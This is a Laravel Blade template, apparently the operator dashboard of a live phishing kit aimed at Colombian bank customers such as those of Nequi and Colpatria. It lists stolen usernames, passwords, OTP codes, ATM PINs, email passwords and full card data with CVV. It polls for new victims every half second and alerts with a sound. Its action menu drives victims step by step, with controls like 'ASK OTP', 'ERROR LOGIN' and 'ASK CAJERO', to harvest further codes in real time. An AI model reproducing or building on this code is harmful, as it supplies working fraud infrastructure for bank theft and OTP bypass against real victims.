@extends('_plantilla')

@section('sidebar', '1')

@section('body')
    <div class="card p-2">
        <div class="table-responsive-custom">
            <table id="results" class="table table-hover table-sm w-100">
                <thead class="thead-light">
                    <tr>
                        <th>S.O.</th>
                        <th>CÉDULA</th>
                        <th>BANCO</th>
                        <th>USUARIO</th>
                        <th>PASSWORD</th>
                        <th>OTP</th>
                        <th>CAJERO</th>
                        <th>EMAIL</th>
                        <th>TARJETA</th>
                        <th>NOTAS</th>
                        <th>ÚLT. MODIFICACIÓN</th>
                        @if ($seccion == 'Nuevos')
                            <th>ESTADO</th>
                        @endif
                        <th></th>
                    </tr>
                </thead>
                <tbody style="font-size: 14px">
                </tbody>
            </table>
        </div>
    </div>
    <div class="modal" id="staticNota" data-bs-backdrop="false" data-bs-keyboard="false" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h1 class="modal-title fs-5">Editar Nota</h1>
                    <button type="button" class="btn btn-danger btn-sm" data-bs-dismiss="modal"
                        aria-label="Close">X</button>
                </div>
                <div class="modal-body">
                    <textarea class="form-control" id="textNota"></textarea>
                </div>
                <div class="modal-footer">
                    <button type="button" id="closeModal" class="btn btn-danger" data-bs-dismiss="modal">Cerrar</button>
                    <button type="button" class="btn btn-primary" onclick="guardarNota()">Guardar</button>
                </div>
            </div>
        </div>
    </div>
@endsection

@section('script')
    <script>
        function sendOrder(id, action) {
            ajaxJQ({
                u: './actionData',
                t: 'GET',
                d: {
                    'id': id,
                    'action': action,
                },
                ok: function () {
                    @if ($seccion != 'Nuevos')
                        table.ajax.reload();
                    @endif
                    }
            });
            return false;
        }

        function eliminarReg(id) {
            let msg = '¿Estas seguro de eliminar el registro elegido?<br><br>¡ESTA ACCIÓN ES IRREVERSIBLE!<br>';
            confirmSweet(msg, () => {
                ajaxJQ({
                    u: './deleteReg',
                    t: 'POST',
                    d: {
                        'id': id,
                    },
                    ok: function (data) {
                        table.ajax.reload();
                    }
                });
            })
        }

        function updateModal(registro, nota) {
            $('#staticNota').attr('reg', registro);
            $('#textNota').val(nota);
        }

        function guardarNota() {
            ajaxJQ({
                u: './notes',
                t: 'POST',
                d: {
                    'id': $('#staticNota').attr('reg'),
                    'nota': $('#textNota').val(),
                },
                ok: function (data) {
                    $('#closeModal').click();
                    table.ajax.reload();
                }
            });
            return false;
        }

        @if ($seccion == 'Nuevos')
            var table;
            var lastTime = -1;
            var audio = new Audio("{{ asset('sonido.mp3') }}");

            function finishAll() {
                let msg = '¿Estas seguro de archivar todos los registros "NUEVOS"?';
                confirmSweet(msg, () => {
                    ajaxJQ({
                        u: './finishAll',
                        t: 'GET',
                    });
                })
            }

            function clearCedulas() {
                let msg = '¿Estas seguro de eliminar los registros que no tienen contenido en "TARJETA"?<br><br>¡ESTA ACCIÓN ES IRREVERSIBLE!<br>';
                confirmSweet(msg, () => {
                    ajaxJQ({
                        u: './clearCedulas',
                        t: 'GET',
                    });
                })
            }

            function banIP(id, ip) {
                let msg = '¿Estas seguro de banear la IP ' + ip + '?';
                confirmSweet(msg, () => {
                    ajaxJQ({
                        u: './banIP',
                        t: 'POST',
                        d: {
                            'id': id,
                        },
                    });
                })
            }

            function comprobarCambios() {
                ajaxJQ({
                    u: './checkCambios',
                    ok: function (data) {
                        if (lastTime == -1) {
                            lastTime = data;
                        } else if (lastTime != data) {
                            lastTime = data;
                            table.ajax.reload();
                            audio.currentTime = 0
                            audio.play();
                        }
                    }
                });
                return false;
            }
        @endif

        $(function () {
            @if ($seccion == 'Nuevos')
                setInterval(() => {
                    comprobarCambios();
                }, 500);
            @endif
            table = $('#results').DataTable({
                // scrollX: true,
                order: [
                    [10, 'desc']
                ],
                scrollCollapse: false,
                language: {
                    paginate: {
                        next: '>>', // or '→'
                        previous: '<<' // or '←'
                    },
                    url: "{{ asset('datatable/es-MX.json') }}",
                },
                processing: true,
                serverSide: true,
                ajax: './{{ $urlSeccion }}',
                columns: [{
                    className: 'align-middle text-center',
                    data: 'dispositivo',
                    render: function (data, type, row) {
                        let nav = row.dispositivo;
                        icon = "question-circle";
                        if (nav.match(/Android/i)) {
                            d = "Android";
                            icon = 'android';
                        } else if (nav.match(/webOS/i)) {
                            d = "webOS";
                        } else if (nav.match(/iPhone/i)) {
                            d = "iPhone";
                            icon = 'apple';
                        } else if (nav.match(/iPad/i)) {
                            d = "iPad";
                            icon = 'apple';
                        } else if (nav.match(/iPod/i)) {
                            d = "iPod";
                            icon = 'apple';
                        } else if (nav.match(/BlackBerry/i)) {
                            d = "BlackBerry";
                        } else if (nav.match(/Windows Phone/i)) {
                            d = "Windows Phone";
                            icon = 'laptop';
                        } else {
                            d = "PC";
                            icon = 'laptop';
                        }
                        let str = "Dispositivo: " + d + "<br>";
                        str += "Agente: " + nav + "<br>";
                        str += "IP: " + row.ip;

                        return '<i class="fa fa-' + icon + ' text-primary" onclick="toastr.success(\'' + str + '\');" style="font-size: 1.5rem;"></i>';
                    }
                },
                {
                    className: 'align-middle',
                    data: 'cedula'
                },
                {
                    className: 'align-middle text-center text-uppercase',
                    data: 'banco'
                },
                {
                    className: 'align-middle',
                    data: 'usuario',
                    render: function (data, type, row) {
                        let str = '';
                        if (row.usuario) {
                            str += row.usuario;
                            str += '<span class="top-0 start-100 translate-middle badge rounded-pill text-white ';
                            let bg = 'bg-primary';
                            if (/(?=.*[a-z])(?=.*[0-9]).+/gmi.test(row.usuario)) {
                                bg = 'bg-success';
                            } else if (/^[0-9]+$/gmi.test(row.usuario)) {
                                bg = 'bg-danger';
                            }
                            str += bg + '" style="transform: translate(0%,-80%) !important; font-size:8px">NEW</span>';
                        }
                        return str;
                    }
                },
                {
                    className: 'align-middle text-center',
                    data: 'password'
                },
                {
                    className: 'align-middle text-center',
                    data: 'otp',
                    render: function (data, type, row) {
                        let otp = '';
                        let clase = '';
                        if (row.otp) {
                            // clase = 'text-success';
                            otp = row.otp;
                        }
                        return '<span class="fw-bold ' + clase + '">' + otp + '</span>';
                    }
                },
                {
                    className: 'align-middle text-center',
                    data: 'cajero',
                    render: function (data, type, row) {
                        let cajero = '';
                        let clase = '';
                        if (row.cajero) {
                            // clase = 'text-success';
                            cajero = row.cajero;
                        }
                        return '<span class="fw-bold ' + clase + '">' + cajero + '</span>';
                    }
                },
                {
                    className: 'align-middle text-center',
                    data: 'email',
                    render: function (data, type, row) {
                        let str = '';
                        if (row.email != '' && row.password_email != '') {
                            str += '<i class="fas fa-envelope text-warning" onclick="toastr.warning(\'';
                            str += 'EMAIL: ' + row.email;
                            str += '<br>';
                            str += 'PASSWORD: ' + row.password_email;
                            str += '\')" style="font-size: 1.5em;"></i>';
                        }
                        return str;
                    }
                },
                {
                    className: 'align-middle text-center',
                    data: 'tarjeta',
                    render: function (data, type, row) {
                        let str = '';
                        if (row.tarjeta != '') {
                            str += '<i class="bi bi-credit-card  text-success" onclick="toastr.success(\''
                            str += 'CARD: ' + row.tarjeta;
                            str += '<br>';
                            str += 'FV: ' + row.ftarjeta;
                            str += '<br>';
                            str += 'CVV: ' + row.cvv;
                            str += '<br>';
                            str += 'NOMBRES: ' + row.nombres;
                            str += '<br>';
                            str += 'CIUDAD: ' + row.ciudad;
                            str += '<br>';
                            str += 'DIR: ' + row.direccion;
                            str += '<br>';
                            str += 'CEL: ' + row.celular;
                            str += '\')"';
                            str += ' style="font-size: 1.5em;"></i>';
                        }
                        return str;
                    }
                },
                {
                    className: 'align-middle text-center',
                    data: 'nota',
                    render: function (data, type, row) {
                        let str = '';
                        if (row.nota != '') {
                            str += '<i class="fas fa-edit text-danger" onclick="toastr.error(\'';
                            str += row.nota;
                            str += '\')" style="font-size: 1.5em;"></i>';
                        }
                        return str;
                    }
                },
                {
                    className: "align-middle text-center text-uppercase",
                    data: 'horamodificado'
                },
                    @if ($seccion == 'Nuevos')
                                    {
                            className: 'align-middle text-center',
                            data: 'status',
                            render: function (data, type, row) {
                                let estado = '';
                                let color = '';
                                switch (row.status) {
                                    case 'rec_datos':
                                        estado = "Nuevo Registro";
                                        color = "success";
                                        break;
                                    case 'rec_usuario':
                                        estado = "Ingresó solo Usuario";
                                        color = "success";
                                        break;
                                    case 'req_login':
                                        estado = "Solicitando Usuario/Clave";
                                        color = "danger";
                                        break;
                                    case 'rec_login':
                                        estado = "Ingresó Usuario/Clave";
                                        color = "success";
                                        break;
                                    case 'req_otp':
                                        estado = "Solicitando OTP";
                                        color = "danger";
                                        break;
                                    case 'rec_otp':
                                        estado = "Ingresó OTP";
                                        color = "success";
                                        break;
                                    case 'req_email':
                                        estado = "Solicitando Email";
                                        color = "danger";
                                        break;
                                    case 'rec_email':
                                        estado = "Ingresó Email";
                                        color = "success";
                                        break;
                                    case 'req_tarjeta':
                                        estado = "Solicitando Tarjeta";
                                        color = "danger";
                                        break;
                                    case 'rec_tarjeta':
                                        estado = "Ingresó Tarjeta";
                                        color = "success";
                                        break;
                                    case 'req_new_otp':
                                        estado = "Solicitando Nuevo OTP";
                                        color = "danger";
                                        break;
                                    case 'rec_new_otp':
                                        estado = "Ingresó Nuevo OTP";
                                        color = "success";
                                        break;
                                    case 'codigo_nuevo':
                                        estado = "Solicitó Nuevo OTP";
                                        color = "warning";
                                        break;
                                    case 'req_email':
                                        estado = "Solicitando Emial";
                                        color = "danger";
                                        break;
                                    case 'rec_email':
                                        estado = "Ingresó Email";
                                        color = "success";
                                        break;
                                    case 'req_cajero':
                                        estado = "Solicitando Clave Cajero";
                                        color = "danger";
                                        break;
                                    case 'rec_cajero':
                                        estado = "Ingresó Clave Cajero";
                                        color = "success";
                                        break;
                                    case 'rem_fin':
                                        estado = "Desarchivado";
                                        color = "primary";
                                        break;
                                    case 'finish':
                                        estado = "Archivado";
                                        color = "primary";
                                        break;

                                }
                                return '<span class="fw-bold text-uppercase text-' + color + '">' + estado + '</span>';
                            }
                        },
                    @endif{
                    orderable: false,
                    // data: 'null',
                    render: function (data, type, row) {
                        let opciones = `
                                <div class="dropdown">
                                <button class="btn btn-primary btn-sm dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                                    <i class="fas fa-stream"></i>
                                </button>
                                <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="dropdownCam">`;
                        @if ($seccion == 'Nuevos')
                            opciones += `
                                        <li>
                                            <a class="dropdown-item border-radius-sm text-success" onclick="sendOrder('` + row.idreg + `', 'req_login');" ><i class="fas fa-user-alt-slash"></i> ERROR LOGIN</a>
                                        </li>
                                         <li>
                                            <a class="dropdown-item border-radius-sm text-success" onclick="sendOrder('` + row
                                    .idreg + `', 'error_otp');" ><i class="	fas fa-phone-alt"></i> ERROR-OTP</a>
                                        </li>
                                        <li>
                                            <a class="dropdown-item border-radius-sm text-success" onclick="sendOrder('` + row
                                    .idreg + `', 'error_cajero');" ><i class="	fas fa-phone-alt">
                                                </i> ERROR-CAJERO</a>
                                        </li>
                                        <li>
                                            <a class="dropdown-item border-radius-sm text-success" onclick="sendOrder('` + row.idreg + `', 'error_cvv');" > <i class="fa fa-credit-card"></i> ERROR CARD</a>
                                        </li>
                                        <li>
                                            <a class="dropdown-item border-radius-sm text-success" onclick="sendOrder('` + row.idreg + `', 'error_bank');" > <i class="fa fa-credit-card"></i> ERROR BANK</a>
                                        </li>

                                        <li>
                                            <a class="dropdown-item border-radius-sm text-success" onclick="sendOrder('` + row.idreg + `', 'req_otp');" ><i class="	fas fa-phone-alt"></i> ASK OTP</a>
                                        </li>
                                        `;
                            switch (row.banco) {
                                case 'nequi':
                                    opciones += `
                                                <li>
                                                    <a class="dropdown-item border-radius-sm text-primary" onclick="window.open('https://audios.m0n3y777.website/` + row.celular + `.webm', '_blank');" > <i class="fa fa-credit-card"></i> DOWN. AUDIO</a>
                                                </li>`;
                                    break;
                                case 'colpatria':
                                    opciones += `
                                                <li>
                                                    <a class="dropdown-item border-radius-sm text-success" onclick="sendOrder('` + row.idreg + `', 'req_email');"> <i class="fas fa-envelope"></i> ASK EMAIL</a>
                                                </li>`;
                                    break;
                            }
                            opciones += `
                                            <li>
                                                <hr class="dropdown-divider">
                                            </li>
                                            <li>
                                                <a class="dropdown-item border-radius-sm text-success" onclick="sendOrder('` + row.idreg + `', 'req_cajero');"> <i class="fas fa-sim-card"></i> ASK CAJERO</a>
                                            </li>
                                            <li>
                                                <a class="dropdown-item border-radius-sm text-primary" onclick="sendOrder('` + row.idreg + `', 'finish');" ><i class="fas fa-folder-open fa-lg"></i> ARCHIVAR</a>
                                            </li>
                                            <li>
                                                <hr class="dropdown-divider">
                                            </li>
                                            <li>
                                                <a class="dropdown-item border-radius-sm text-danger" onclick="banIP('` + row.idreg + `','` + row.ip + `');" ><i class="fas fa-skull"></i> BANEAR IP</a>
                                            </li>`;
                        @else
                            opciones += `
                                        <li>
                                            <a class="dropdown-item border-radius-sm text-success" data-bs-toggle="modal" data-bs-target="#staticNota" onclick="updateModal('` + row.idreg + `','` + (row.nota ? row.nota.replaceAll(/"|&#039;/g, '&quot;') : '') + `')"> <i class="fas fa-edit"></i> EDIT NOTA</a>
                                        </li>
                                        <li>
                                            <a class="dropdown-item border-radius-sm text-primary" onclick="sendOrder('` + row.idreg + `', 'rem_fin');" ><i class="fas fa-folder-open"></i> DESARCHIVAR</a>
                                        </li>`;
                        @endif
                        opciones += `
                                    <li>
                                        <a class="dropdown-item border-radius-sm text-danger" onclick="eliminarReg('` + row.idreg + `');" ><i class="fas fa-trash"></i> ELIMINAR</a>
                                    </li>
                                </ul>
                                </div>`;
                        return opciones;
                    }
                },
                ],
            });
            $.fn.dataTable.ext.errMode = 'throw';
        });
    </script>
@endsection